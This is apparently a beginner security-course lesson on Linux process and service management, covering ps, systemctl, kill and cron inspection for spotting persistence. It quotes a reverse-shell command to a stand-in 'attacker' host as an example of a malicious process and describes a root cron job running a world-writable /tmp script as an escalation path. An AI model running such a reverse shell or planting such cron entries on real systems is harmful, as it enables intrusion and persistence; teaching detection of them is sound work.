# 02-4 · Process & Service Management

> **Level:** Beginner · **Prerequisites:** [02-3 Networking commands](03_networking_commands.md)
> **Time:** ~1.5 hours · **Verified:** 2026-06-25

> ⚠️ **LEGAL REMINDER:** Practice on lab containers and your own machines only.

---

## Why this matters

After gaining access to a system, one of the first things you do is look for processes and services — both to understand the attack surface and to find persistence mechanisms. On the blue-team side, hunting for malicious processes is a core incident response skill.

---

## Listing processes

```bash
# Snapshot of all processes
ps aux

# Filter for a specific process
ps aux | grep python

# Real-time process viewer (q to quit)
top
```

`ps aux` columns: `USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND`

The `COMMAND` column is most useful — it shows what was run, including arguments. A legitimate web server shows `python3 app.py`; a reverse shell might show `bash -i >& /dev/tcp/attacker/4444 0>&1`.

---

## Services with systemctl

```bash
# List all running services
systemctl list-units --type=service --state=running

# Status of a specific service
systemctl status ssh

# Start/stop/restart
systemctl start ssh
systemctl stop ssh
systemctl restart ssh

# Enable/disable at boot
systemctl enable ssh
systemctl disable ssh
```

---

## Killing processes

```bash
kill 1234          # graceful (SIGTERM)
kill -9 1234       # force kill (SIGKILL)
killall python3    # kill all processes named python3
```

---

## Cron jobs: scheduled task persistence

```bash
# Current user's crontab
crontab -l

# System-wide cron jobs
cat /etc/crontab
ls /etc/cron.d/
ls /etc/cron.daily/
```

Cron format: `minute hour day month weekday command`
```
*/5 * * * * /usr/bin/backup.sh    # every 5 minutes
0 3 * * * /usr/bin/cleanup.sh     # 3am every day
```

**Why it matters:** malware often persists via cron jobs. If you find an unfamiliar cron entry pointing to a world-writable script, that's a privilege escalation path.

---

## Recap & next

- ✅ `ps aux` lists all processes with user, PID, and command
- ✅ `systemctl` manages services
- ✅ `crontab -l` and `/etc/cron.d/` reveal scheduled tasks
- ✅ Unusual processes and cron entries are persistence indicators

**Self-check:** You see this cron entry: `* * * * * root /tmp/update.sh`. What is suspicious about it?

<details>
<summary>Answer</summary>

Two red flags: (1) it runs every minute as root — maximum persistence, (2) it runs from `/tmp/`, which is world-writable on most Linux systems. Anyone can overwrite `/tmp/update.sh` to run arbitrary commands as root. This is a classic persistence + privilege escalation path used by attackers (and found in CTFs).

</details>

---

## Exercises

**1. Find processes.** Inside the attacker container, use `ps aux` to find the PID of bash. What user is it running as? Try `ps aux | grep flask` — is Flask running?

**2. Cron inspection.** Check the system crontab (`/etc/crontab`) and any user crontabs. Are there any scheduled tasks? What would you do if you found one pointing to a writable file?

---

**Next → [05 Bash scripting basics](05_bash_scripting_basics.md)**
